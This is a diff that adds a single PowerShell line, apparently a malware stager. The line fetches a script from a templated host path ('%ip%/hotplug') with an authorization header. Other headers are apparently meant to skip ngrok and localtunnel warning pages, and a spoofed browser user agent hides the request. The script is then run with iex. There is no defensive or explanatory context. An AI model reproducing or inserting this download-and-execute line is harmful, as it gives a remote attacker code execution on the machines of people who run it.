@@ -1,0 +1,1 @@
+(Invoke-RestMethod -Uri "https://%ip%/hotplug" -Headers @{"Authorization"="%auth%";"Bypass-Tunnel-Reminder"="%auth%";"ngrok-skip-browser-warning"="%auth%";"User-Agent"="Mozilla/5.0"}).ToString() | iex
